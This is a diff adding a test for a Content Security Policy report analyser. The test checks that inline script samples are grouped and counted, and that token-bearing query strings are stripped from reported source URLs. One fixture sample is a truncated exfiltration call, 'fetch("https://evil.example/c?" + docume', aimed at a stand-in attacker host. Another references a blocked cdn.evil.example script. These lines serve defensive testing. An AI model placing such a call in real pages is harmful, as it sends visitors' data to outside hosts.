@@ -249,6 +249,32 @@ describe('explainReports', () => {
     expect(after.lines.map((l) => l.line)).toEqual(["script-src 'self' 'nonce-abc' https://img.shop-cdn.example https://static.shop-cdn.example"]);
   });
 
+  it('keeps what the reports quoted: the start of the code and the scripts that asked, or the rule that would quote it', () => {
+    const input = [
+      report({ blockedURL: 'inline', effectiveDirective: 'script-src-elem', sample: 'window.dataLayer = window.dataLayer || [', sourceFile: 'https://shop.example.com/' }),
+      report({ blockedURL: 'inline', effectiveDirective: 'script-src-elem', sample: 'window.dataLayer = window.dataLayer || [', sourceFile: 'https://shop.example.com/' }),
+      report({ blockedURL: 'inline', effectiveDirective: 'script-src-elem', sample: 'fetch("https://evil.example/c?" + docume' }),
+      report({ blockedURL: 'https://cdn.evil.example/x.js', effectiveDirective: 'script-src-elem', sourceFile: 'https://shop.example.com/assets/theme.js?v=3&token=secret' }),
+      // No sample, and the rule doesn't ask for one.
+      report({ blockedURL: 'inline', effectiveDirective: 'style-src-attr' }),
+    ].join('\n');
+    const e = explainReports(input, vendors);
+    const inline = e.groups.find((g) => g.explained.case === 'inline')!;
+    expect(inline.samples).toEqual([
+      { text: 'window.dataLayer = window.dataLayer || [', reports: 2 },
+      { text: 'fetch("https://evil.example/c?" + docume', reports: 1 },
+    ]);
+    expect(inline.sources).toEqual([{ file: 'https://shop.example.com/', reports: 2 }]);
+    // Without its query string, which can hold a token.
+    expect(e.groups.find((g) => g.explained.host === 'cdn.evil.example')!.sources).toEqual([{ file: 'https://shop.example.com/assets/theme.js', reports: 1 }]);
+    const attr = e.groups.find((g) => g.explained.case === 'style-attr')!;
+    expect(attr.samples).toBeUndefined();
+    expect(attr.sampleRule).toBe('default-src');
+    // A rule that asks for samples needs no advice.
+    const asked = explainReports(report({ blockedURL: 'inline', effectiveDirective: 'script-src-elem', originalPolicy: "script-src 'self' 'report-sample'" }), vendors);
+    expect(asked.groups[0]!.sampleRule).toBeUndefined();
+  });
+
   it('tells pages where visitors pay or sign in, word by word', () => {
     expect(['/checkout?step=2', '/fr/panier', '/account/orders', '/sign-in', '/de/warenkorb', 'https://shop.example.com/login'].every(isSensitive)).toBe(true);
     expect(['/', '/display', '/products/payload-bag', '/blog/signing-off', '/cartoons'].some(isSensitive)).toBe(false);
